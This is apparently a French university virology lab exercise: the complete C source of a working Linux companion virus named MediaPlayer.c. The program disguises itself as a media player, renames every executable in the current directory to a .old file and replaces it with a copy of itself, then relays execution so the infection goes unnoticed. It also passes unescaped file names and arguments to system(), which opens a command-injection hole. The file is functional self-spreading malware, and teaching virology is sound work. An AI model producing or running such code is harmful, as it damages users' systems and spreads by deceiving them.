/*
 * TP Virologie - Conception d'un virus compagnon
 * Nom du fichier : MediaPlayer.c
 *
 * Description : Ce programme est un virus compagnon écrit en C pour Linux.
 * Il se cache sous le nom de "MediaPlayer.exe" pour inciter l'utilisateur à l'exécuter.
 * Une fois lancé, il rend un service (affiche une image/message) tout en infectant
 * d'autres fichiers exécutables dans le répertoire courant.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

/*
 * Qu'est-ce qu'un virus compagnon ?
 * C'est un virus qui ne modifie pas le code du fichier cible. Il se contente de
 * "voler" son identité en créant un fichier portant le même nom, tandis que le
 * programme original est renommé (souvent avec une extension type .old).
 *
 * Pourquoi le nom MediaPlayer.exe ?
 * C'est un nom qui inspire confiance pour un utilisateur moyen, facilitant
 * la "primo-infection" par ingénierie sociale.
 */

// Fonction pour simuler le rendu de service
void rendre_service() {
    printf("========================================\n");
    printf("         MEDIA PLAYER v1.0              \n");
    printf("========================================\n");
    printf("[-] Chargement du média en cours...\n");
    printf("[+] Lecture de l'image : illustration.jpg\n");
    printf("    [IMAGE SIMULÉE : UN BEAU PAYSAGE]\n");
    printf("========================================\n\n");
}

// Fonction pour vérifier si un fichier est un exécutable régulier
int est_cible_valide(const char *filename) {
    struct stat st;
    if (stat(filename, &st) == 0) {
        // S_ISREG : fichier régulier, S_IXUSR : exécutable par le propriétaire
        return (S_ISREG(st.st_mode) && (st.st_mode & S_IXUSR));
    }
    return 0;
}

// 1. Il faut vérifier si le fichier cible porte déjà l'extension ".old".
// 2. Il faut vérifier s'il existe déjà un fichier avec le même nom portanc l'extension ".old"
//    dans le répertoire, ce qui signifierait que le fichier actuel est déjà le virus.

// Fonction de vérification double
int est_deja_infecte(const char *filename) {
    // 1. Est-ce que le fichier lui-même finit par .old ?
    if (strstr(filename, ".old") != NULL) return 1;

    // 2. Est-ce qu'un fichier "nom.old" existe déjà ?
    char old_name[256];
    snprintf(old_name, sizeof(old_name), "%s.old", filename);
    if (access(old_name, F_OK) == 0) return 1;

    return 0;
}

// Fonction pour infecter un fichier
void infecter_cible(const char *virus_path, const char *cible) {
    char old_name[256];
    snprintf(old_name, sizeof(old_name), "%s.old", cible);

    // Étape 1 : Renommer le fichier cible avec l'extension .old
    if (rename(cible, old_name) != 0) {
        perror("[-] Erreur lors du renommage de la cible");
        return;
    }

    // Étape 2 : Copier le virus vers le nom de la cible
    // On utilise une commande système pour la simplicité (cp)
    char commande[512];
    snprintf(commande, sizeof(commande), "cp \"%s\" \"%s\"", virus_path, cible);

    if (system(commande) == 0) {
        printf("[+] Infection réussie : %s (original -> %s)\n", cible, old_name);

        // Étape 3 : S'assurer que la copie est exécutable
        chmod(cible, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
    } else {
        printf("[-] Erreur lors de la copie du virus vers %s\n", cible);
    }
}

// Fonction pour parcourir le répertoire et lister les cibles
void rechercher_et_infecter(const char *virus_path) {
    struct dirent *entree;
    DIR *rep = opendir(".");

    if (rep == NULL) {
        perror("Erreur lors de l'ouverture du répertoire");
        return;
    }

    printf("[-] Recherche de cibles et infection...\n");
    while ((entree = readdir(rep)) != NULL) {
        // On ignore le virus original et les fichiers non cibles
        if (strcmp(entree->d_name, "MediaPlayer.exe") != 0 &&
            strcmp(entree->d_name, "MediaPlayer.c") != 0 &&
            strcmp(entree->d_name, ".") != 0 &&
            strcmp(entree->d_name, "..") != 0) {

            if (est_cible_valide(entree->d_name)) {
                if (!est_deja_infecte(entree->d_name)) {
                    infecter_cible(virus_path, entree->d_name);
                } else {
                    printf("[i] Saut de %s (déjà infecté)\n", entree->d_name);
                }
            }
        }
    }
    closedir(rep);
}

// Fonction pour transférer l'exécution au programme original
void executer_original(const char *nom_prog, int argc, char *argv[]) {
    // Si nous sommes le virus original "MediaPlayer.exe", point de transfert nécessaire.
    if (strstr(nom_prog, "MediaPlayer.exe") != NULL) {
        return;
    }

    // Sinon, nous sommes une copie infectée lancée à la place de l'original.
    char original_path[256];
    snprintf(original_path, sizeof(original_path), "%s.old", nom_prog);

    if (access(original_path, F_OK) == 0) {
        printf("[i] Transfert d'exécution vers l'original : %s\n", original_path);

        // Re-construction de la commande avec les arguments originaux
        char commande[1024] = "";
        snprintf(commande, sizeof(commande), "./%s", original_path);
        for (int i = 1; i < argc; i++) {
            strncat(commande, " ", sizeof(commande) - strlen(commande) - 1);
            strncat(commande, argv[i], sizeof(commande) - strlen(commande) - 1);
        }

        // Exécution du programme original
        system(commande);
    } else {
        printf("[-] Erreur : Programme original %s introuvable.\n", original_path);
    }
}

int main(int argc, char *argv[]) {
    // 1. Rendre le service promis à l'utilisateur
    rendre_service();

    // 2. Infecter les cibles
    rechercher_et_infecter(argv[0]);

    // 3. Transférer l'exécution si nous sommes une copie
    executer_original(argv[0], argc, argv);

    printf("\n[Info] Fin du programme.\n");

    return 0;
}
